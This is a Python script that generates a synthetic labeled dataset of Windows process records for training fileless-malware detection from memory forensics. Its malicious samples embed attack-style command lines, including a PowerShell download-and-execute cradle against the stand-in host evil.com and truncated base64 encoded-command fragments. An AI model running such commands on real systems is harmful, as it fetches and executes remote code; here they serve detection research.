"""
data_generator.py
Generates synthetic RAM/process data simulating Volatility memory forensics output.
Produces a labeled dataset of benign and fileless malware process samples.
"""

import numpy as np
import pandas as pd
import random
import string
import os
from datetime import datetime, timedelta


BENIGN_PROCESSES = [
    ('System', 4, 0),
    ('smss.exe', None, 4),
    ('csrss.exe', None, None),
    ('wininit.exe', None, None),
    ('services.exe', None, None),
    ('lsass.exe', None, None),
    ('svchost.exe', None, None),
    ('explorer.exe', None, None),
    ('chrome.exe', None, None),
    ('firefox.exe', None, None),
    ('notepad.exe', None, None),
    ('calc.exe', None, None),
    ('taskmgr.exe', None, None),
    ('conhost.exe', None, None),
    ('SearchIndexer.exe', None, None),
    ('MsMpEng.exe', None, None),
    ('OneDrive.exe', None, None),
    ('spoolsv.exe', None, None),
    ('winlogon.exe', None, None),
    ('RuntimeBroker.exe', None, None),
]

LOLBINS = ['powershell.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe',
           'mshta.exe', 'regsvr32.exe', 'rundll32.exe', 'certutil.exe',
           'msiexec.exe', 'bitsadmin.exe']

SUSPICIOUS_PARENTS = ['WINWORD.EXE', 'EXCEL.EXE', 'Outlook.exe', 'AcroRd32.exe', 'iexplore.exe']

HOLLOWING_TARGETS = ['svchost.exe', 'explorer.exe', 'notepad.exe', 'calc.exe', 'mspaint.exe']

ENCODED_PS_TEMPLATES = [
    '-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...',
    '-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...',
    '-e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...',
]


def _rand_pid():
    return random.randint(400, 9999)


def _rand_cmd_benign(name):
    cmds = {
        'chrome.exe': 'chrome.exe --type=renderer --disable-gpu',
        'svchost.exe': 'C:\\Windows\\system32\\svchost.exe -k netsvcs',
        'explorer.exe': 'C:\\Windows\\Explorer.EXE',
        'MsMpEng.exe': '"C:\\Program Files\\Windows Defender\\MsMpEng.exe"',
    }
    return cmds.get(name, f'C:\\Windows\\System32\\{name}')


def _rand_b64():
    length = random.randint(50, 150)
    b64chars = string.ascii_letters + string.digits + '+/='
    return ''.join(random.choice(b64chars) for _ in range(length))


def generate_benign_sample(rng):
    proc_name, fixed_pid, fixed_ppid = random.choice(BENIGN_PROCESSES)
    pid = fixed_pid if fixed_pid else _rand_pid()
    ppid = fixed_ppid if fixed_ppid else _rand_pid()
    return {
        'process_name': proc_name,
        'pid': pid,
        'ppid': ppid,
        'cmd_line': _rand_cmd_benign(proc_name),
        'cmd_line_length': rng.integers(20, 120),
        'num_threads': int(rng.integers(1, 40)),
        'num_handles': int(rng.integers(50, 500)),
        'working_set_mb': round(float(rng.uniform(1.0, 200.0)), 2),
        'private_bytes_mb': round(float(rng.uniform(0.5, 100.0)), 2),
        'session_id': int(rng.integers(0, 2)),
        'is_signed': 1,
        'num_loaded_dlls': int(rng.integers(5, 80)),
        'has_network_conn': int(rng.integers(0, 2)) if proc_name in ['chrome.exe', 'firefox.exe', 'OneDrive.exe'] else 0,
        'num_network_conns': int(rng.integers(1, 20)) if proc_name in ['chrome.exe', 'firefox.exe'] else 0,
        'writable_exec_sections': 0,
        'private_memory_ratio': round(float(rng.uniform(0.05, 0.35)), 3),
        'heap_executable': 0,
        'vad_count': int(rng.integers(20, 120)),
        'suspicious_parent': 0,
        'process_hollowing': 0,
        'dll_injection': 0,
        'reflective_load': 0,
        'encoded_powershell': 0,
        'lolbin_usage': 0,
        'wmi_execution': 0,
        'unusual_thread_start': 0,
        'yara_hits': 0,
        'memory_anomaly_score': round(float(rng.uniform(0.0, 0.15)), 4),
        'label': 0,
    }


def generate_malicious_sample(rng, attack_type=None):
    types = ['process_hollowing', 'lolbin_abuse', 'dll_injection', 'ps_encoded', 'wmi_exec']
    if attack_type is None:
        attack_type = random.choice(types)

    sample = {
        'pid': _rand_pid(),
        'ppid': _rand_pid(),
        'cmd_line_length': 0,
        'cmd_line': '',
        'num_threads': 0,
        'num_handles': 0,
        'working_set_mb': 0.0,
        'private_bytes_mb': 0.0,
        'session_id': 1,
        'is_signed': 0,
        'num_loaded_dlls': 0,
        'has_network_conn': 0,
        'num_network_conns': 0,
        'writable_exec_sections': 0,
        'private_memory_ratio': 0.0,
        'heap_executable': 0,
        'vad_count': 0,
        'suspicious_parent': 0,
        'process_hollowing': 0,
        'dll_injection': 0,
        'reflective_load': 0,
        'encoded_powershell': 0,
        'lolbin_usage': 0,
        'wmi_execution': 0,
        'unusual_thread_start': 0,
        'yara_hits': 0,
        'memory_anomaly_score': 0.0,
        'label': 1,
    }

    if attack_type == 'process_hollowing':
        proc = random.choice(HOLLOWING_TARGETS)
        parent = random.choice(SUSPICIOUS_PARENTS)
        sample.update({
            'process_name': proc,
            'cmd_line': f'C:\\Windows\\System32\\{proc}',
            'cmd_line_length': int(rng.integers(30, 80)),
            'num_threads': int(rng.integers(2, 8)),
            'num_handles': int(rng.integers(50, 200)),
            'working_set_mb': round(float(rng.uniform(20.0, 150.0)), 2),
            'private_bytes_mb': round(float(rng.uniform(30.0, 120.0)), 2),
            'is_signed': 0,
            'num_loaded_dlls': int(rng.integers(3, 15)),
            'writable_exec_sections': int(rng.integers(1, 5)),
            'private_memory_ratio': round(float(rng.uniform(0.6, 0.95)), 3),
            'heap_executable': 1,
            'vad_count': int(rng.integers(50, 200)),
            'suspicious_parent': 1,
            'process_hollowing': 1,
            'unusual_thread_start': 1,
            'yara_hits': int(rng.integers(2, 6)),
            'memory_anomaly_score': round(float(rng.uniform(0.65, 0.99)), 4),
            'has_network_conn': 1,
            'num_network_conns': int(rng.integers(1, 10)),
        })

    elif attack_type == 'lolbin_abuse':
        lolbin = random.choice(LOLBINS)
        parent = random.choice(SUSPICIOUS_PARENTS)
        enc = random.choice(ENCODED_PS_TEMPLATES) if 'powershell' in lolbin else ''
        sample.update({
            'process_name': lolbin,
            'cmd_line': f'{lolbin} {enc if enc else "-c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt)"}',
            'cmd_line_length': int(rng.integers(80, 300)),
            'num_threads': int(rng.integers(1, 6)),
            'num_handles': int(rng.integers(20, 150)),
            'working_set_mb': round(float(rng.uniform(10.0, 80.0)), 2),
            'private_bytes_mb': round(float(rng.uniform(5.0, 60.0)), 2),
            'is_signed': 1,
            'num_loaded_dlls': int(rng.integers(10, 40)),
            'writable_exec_sections': int(rng.integers(0, 3)),
            'private_memory_ratio': round(float(rng.uniform(0.4, 0.8)), 3),
            'heap_executable': int(rng.integers(0, 2)),
            'vad_count': int(rng.integers(30, 120)),
            'suspicious_parent': 1,
            'lolbin_usage': 1,
            'encoded_powershell': 1 if 'powershell' in lolbin else int(rng.integers(0, 2)),
            'yara_hits': int(rng.integers(1, 5)),
            'memory_anomaly_score': round(float(rng.uniform(0.45, 0.90)), 4),
            'has_network_conn': 1,
            'num_network_conns': int(rng.integers(1, 5)),
        })

    elif attack_type == 'dll_injection':
        target = random.choice(['explorer.exe', 'svchost.exe', 'notepad.exe'])
        sample.update({
            'process_name': target,
            'cmd_line': f'C:\\Windows\\System32\\{target}',
            'cmd_line_length': int(rng.integers(30, 60)),
            'num_threads': int(rng.integers(5, 20)),
            'num_handles': int(rng.integers(100, 400)),
            'working_set_mb': round(float(rng.uniform(50.0, 300.0)), 2),
            'private_bytes_mb': round(float(rng.uniform(40.0, 200.0)), 2),
            'is_signed': 0,
            'num_loaded_dlls': int(rng.integers(50, 150)),
            'writable_exec_sections': int(rng.integers(2, 8)),
            'private_memory_ratio': round(float(rng.uniform(0.55, 0.95)), 3),
            'heap_executable': 1,
            'vad_count': int(rng.integers(80, 250)),
            'dll_injection': 1,
            'reflective_load': int(rng.integers(0, 2)),
            'yara_hits': int(rng.integers(1, 4)),
            'memory_anomaly_score': round(float(rng.uniform(0.55, 0.95)), 4),
            'has_network_conn': int(rng.integers(0, 2)),
            'num_network_conns': int(rng.integers(0, 8)),
        })

    elif attack_type == 'ps_encoded':
        enc_cmd = random.choice(ENCODED_PS_TEMPLATES) + _rand_b64()
        sample.update({
            'process_name': 'powershell.exe',
            'cmd_line': f'powershell.exe {enc_cmd}',
            'cmd_line_length': len(enc_cmd),
            'num_threads': int(rng.integers(2, 10)),
            'num_handles': int(rng.integers(30, 200)),
            'working_set_mb': round(float(rng.uniform(15.0, 100.0)), 2),
            'private_bytes_mb': round(float(rng.uniform(10.0, 80.0)), 2),
            'is_signed': 1,
            'num_loaded_dlls': int(rng.integers(20, 60)),
            'writable_exec_sections': int(rng.integers(0, 3)),
            'private_memory_ratio': round(float(rng.uniform(0.5, 0.85)), 3),
            'heap_executable': int(rng.integers(0, 2)),
            'vad_count': int(rng.integers(40, 130)),
            'suspicious_parent': int(rng.integers(0, 2)),
            'lolbin_usage': 1,
            'encoded_powershell': 1,
            'yara_hits': int(rng.integers(2, 5)),
            'memory_anomaly_score': round(float(rng.uniform(0.60, 0.92)), 4),
            'has_network_conn': 1,
            'num_network_conns': int(rng.integers(1, 6)),
        })

    elif attack_type == 'wmi_exec':
        sample.update({
            'process_name': random.choice(['WmiPrvSE.exe', 'wmiprvse.exe', 'svchost.exe']),
            'cmd_line': 'wmiprvse.exe -secured -Embedding',
            'cmd_line_length': int(rng.integers(30, 100)),
            'num_threads': int(rng.integers(3, 12)),
            'num_handles': int(rng.integers(80, 300)),
            'working_set_mb': round(float(rng.uniform(20.0, 120.0)), 2),
            'private_bytes_mb': round(float(rng.uniform(15.0, 100.0)), 2),
            'is_signed': 1,
            'num_loaded_dlls': int(rng.integers(15, 50)),
            'writable_exec_sections': int(rng.integers(1, 4)),
            'private_memory_ratio': round(float(rng.uniform(0.45, 0.80)), 3),
            'heap_executable': int(rng.integers(0, 2)),
            'vad_count': int(rng.integers(50, 180)),
            'wmi_execution': 1,
            'suspicious_parent': int(rng.integers(0, 2)),
            'yara_hits': int(rng.integers(1, 4)),
            'memory_anomaly_score': round(float(rng.uniform(0.50, 0.88)), 4),
            'has_network_conn': int(rng.integers(0, 2)),
            'num_network_conns': int(rng.integers(0, 4)),
        })

    return sample


def generate_dataset(n_benign=1500, n_malicious=500, seed=42):
    rng = np.random.default_rng(seed)
    samples = []

    for _ in range(n_benign):
        samples.append(generate_benign_sample(rng))

    attack_types = ['process_hollowing', 'lolbin_abuse', 'dll_injection', 'ps_encoded', 'wmi_exec']
    per_type = n_malicious // len(attack_types)
    remainder = n_malicious % len(attack_types)

    for i, attack_type in enumerate(attack_types):
        count = per_type + (1 if i < remainder else 0)
        for _ in range(count):
            samples.append(generate_malicious_sample(rng, attack_type))

    random.shuffle(samples)
    df = pd.DataFrame(samples)

    # Fill any NaN values
    df = df.fillna(0)

    # Ensure integer columns are properly typed
    int_cols = ['pid', 'ppid', 'num_threads', 'num_handles', 'session_id', 'is_signed',
                'num_loaded_dlls', 'has_network_conn', 'num_network_conns',
                'writable_exec_sections', 'heap_executable', 'vad_count',
                'suspicious_parent', 'process_hollowing', 'dll_injection',
                'reflective_load', 'encoded_powershell', 'lolbin_usage',
                'wmi_execution', 'unusual_thread_start', 'yara_hits', 'label']
    for col in int_cols:
        if col in df.columns:
            df[col] = df[col].astype(int)

    return df


def save_dataset(df, path='data/memory_process_data.csv'):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    df.to_csv(path, index=False)
    return path


if __name__ == '__main__':
    df = generate_dataset(n_benign=1500, n_malicious=500)
    save_dataset(df)
    print(f"Generated {len(df)} samples: {df['label'].sum()} malicious, {(df['label']==0).sum()} benign")
    print(df.head())
